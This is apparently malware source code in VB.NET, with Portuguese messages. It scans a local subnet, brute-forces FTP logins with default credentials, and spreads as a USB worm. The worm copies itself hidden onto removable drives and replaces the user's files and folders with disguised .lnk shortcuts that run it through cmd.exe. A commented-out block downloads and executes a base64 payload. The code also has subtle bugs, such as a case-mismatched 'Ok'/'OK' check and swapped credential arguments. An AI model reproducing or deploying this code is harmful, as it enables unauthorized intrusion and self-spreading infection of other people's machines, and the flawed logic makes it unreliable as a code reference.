Imports System.IO, System.Net
Public Class Form1
    Private bruteusers() As String = {"adm", "usuario", "123"}
    Private brutepass() As String = {"adm", "usuario", "123"}
    Private hosts As New List(Of String)()
    Private Off As Boolean = False
    Private thread As Threading.Thread = Nothing
    Private r As New Random
    Private ExeName As String = r.Next(100, 9999999) & ".exe"
    Private Sub Form1_Load(ByVal sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        For A = 0 To 20 Step 1
            Try
                If My.Computer.Network.Ping("192.168.0." & A) Then
                    hosts.Add("192.168.0." & A)
                End If
            Catch ex As Exception
            End Try
        Next
        MsgBox(hosts.Count & " Hosts encontrados na rede")
        For A = 0 To hosts.Count - 1 Step 1
            Dim ender As String = ftpbrute(hosts(A))
        Next
        'usb()
        'Dim b64src, mlwname As String
        'b64src = New UTF8Encoding().GetString(mininav.DownloadData(dados(1)))
        'mlwname = "/" & RandomString() & ".exe"
        'IO.File.WriteAllBytes(IO.Path.GetTempPath & mlwname, Convert.FromBase64String(b64src))
        'Threading.Thread.Sleep(1000)
        'Process.Start(IO.Path.GetTempPath & mlwname)
    End Sub
    Private Function ftpfunc(ByVal server As String, ByVal pass As String, ByVal user As String)
        Try
            Dim fwr As FtpWebRequest = FtpWebRequest.Create("ftp://" & server)
            fwr.Credentials = New NetworkCredential(user, pass)
            fwr.Method = WebRequestMethods.Ftp.ListDirectory
            Dim sr As New StreamReader(fwr.GetResponse().GetResponseStream())
            sr = Nothing
            fwr = Nothing
            Return "Ok"
        Catch ex As Exception
            Return "ERRO"
        End Try
    End Function
    Private Function ftpbrute(ByVal server As String)
        Dim cpass As String = ""
        Dim cuser As String = ""
        Dim found As Boolean = False
        For A = 0 To bruteusers.Count - 1 Step 1
            If found = True Then
                Exit For
            End If
            For B = 0 To brutepass.Count - 1 Step 1
                Dim ksk As String
                ksk = ftpfunc(server, bruteusers(A), brutepass(B))
                If ksk = "OK" Then
                    cpass = brutepass(B)
                    cuser = bruteusers(A)
                    found = True
                    Exit For
                End If
            Next
        Next
        If found = True Then
            MsgBox("USUARIO DO FTP ENCONTRADO:" & vbNewLine & "Server: " & server & vbNewLine & "User: " & cuser & vbNewLine & "Senha: " & cpass)
        End If
        Return "OK"
    End Function
    Public Sub start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub
    Public Sub clean()
        Off = True
        Do Until thread Is Nothing
            Threading.Thread.Sleep(1)
        Loop
        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or
                            x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                        & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)
                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Sub usb()
        Off = False
        Do Until Off = True
            For Each x In IO.DriveInfo.GetDrives
                Try
                    If x.IsReady Then
                        If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType.Removable Or x.DriveType = IO.DriveType.CDRom Then
                            Try
                                If IO.File.Exists(x.Name & ExeName) Then
                                    IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Normal)
                                End If
                                IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                For Each xx As String In IO.Directory.GetFiles(x.Name)
                                    If IO.Path.GetExtension(xx).ToLower <> ".lnk" And
                                    xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then
                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                        IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                        With CreateObject("WScript.shell").CreateShortCut _
                                            (x.Name & New IO.FileInfo(xx).Name & ".lnk")
                                            .TargetPath = "cmd.exe"
                                            .WorkingDirectory = ""
                                            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34)) _
                                                & " " & ChrW(34) & "&start " & New IO.FileInfo(xx) _
                                                .Name.Replace(" ", ChrW(34) & " " & ChrW(34)) & " & exit"
                                            .IconLocation = GetIcon(IO.Path.GetExtension(xx))
                                            .Save()
                                        End With
                                    End If
                                Next
                                For Each xx As String In IO.Directory.GetDirectories(x.Name)
                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                    IO.File.Delete(x.Name & New IO.DirectoryInfo(xx).Name & " .lnk")
                                    With CreateObject("WScript.Shell") _
                                        .CreateShortCut(x.Name & IO.Path.GetFileNameWithoutExtension(xx) & " .lnk")
                                        .TargetPath = "cmd.exe"
                                        .WorkingDirectory = ""
                                        .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
                                         & " " & ChrW(34)) & "&explorer /root, ""%CD%" & New _
                                         IO.DirectoryInfo(xx).Name & """ & exit"
                                        .Iconlocation = "%SystemRoot%\system32\SHELL32.dll,3"
                                        .Save()
                                    End With
                                Next
                            Catch : End Try
                        End If
                    End If
                Catch ex As Exception
                End Try
            Next
            Threading.Thread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub

    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False)
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "")
            If e.Contains(",") = False Then e &= ",0"
            Return e
        Catch ex As Exception
            Return ""
        End Try
    End Function
End Class